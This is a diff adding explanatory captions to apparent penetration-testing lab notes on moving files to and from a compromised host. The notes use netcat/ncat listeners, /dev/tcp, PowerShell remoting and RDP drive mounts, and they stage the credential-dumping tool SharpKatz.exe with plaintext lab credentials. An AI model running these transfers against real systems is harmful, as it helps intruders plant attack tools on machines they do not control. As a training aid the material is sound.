@@ -31,6 +31,7 @@ nc -l -p 8000 > SharpKatz.exe
 # Ncat (use --recv-only to auto-close after transfer)
 ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
+> Listens on port 8000 on the compromised host and writes the incoming stream to a file; change the port and output filename.
 
 **Attack Host — Send File:**
 
@@ -59,6 +60,7 @@ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 # Ncat
 sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
+> Attacker listens on port 443 and feeds a file so the target can pull it (firewall-friendly direction); change the port and source filename.
 
 **Compromised Machine — Connect and Receive:**
 
@@ -87,6 +89,7 @@ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 # Ncat
 sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
+> Attacker listens on port 443 feeding the file so a toolless target can grab it via /dev/tcp; change the port and source filename.
 
 **Compromised Machine — Receive via /dev/tcp:**
 
@@ -127,6 +130,7 @@ For Windows-to-Windows transfers when HTTP/SMB are blocked. Uses WinRM on **TCP/
 ```powershell
 Test-NetConnection -ComputerName DATABASE01 -Port 5985
 ```
+> Tests whether WinRM (port 5985) is reachable on the remote host before opening a session; swap the computer name and port.
 
 Confirm `TcpTestSucceeded : True` before proceeding.
 
@@ -135,6 +139,7 @@ Confirm `TcpTestSucceeded : True` before proceeding.
 ```powershell
 $Session = New-PSSession -ComputerName DATABASE01
 ```
+> Opens a PowerShell Remoting session to the target and stores it in $Session for file copies; change the computer name (add -Credential if needed).
 
 ### Step 3: Transfer Files
 
@@ -143,6 +148,7 @@ $Session = New-PSSession -ComputerName DATABASE01
 ```powershell
 Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
 ```
+> Pushes a local file to the remote host through the PS session; swap the source path and destination path.
 
 **Download — Remote to Local:**
 
@@ -169,12 +175,14 @@ Exposes a local directory as a network share inside the RDP session at `\\tsclie
 ```bash
 rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
+> Opens an RDP session mounting a local folder as a shared drive named `linux`; swap the IP, domain, credentials, and local path.
 
 **Using xfreerdp:**
 
 ```bash
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
+> Same RDP folder-mount using xfreerdp; swap the IP, domain, credentials, and local directory path.
 
 **Access in Remote Session:** Navigate to `\\tsclient\linux` in File Explorer.
 
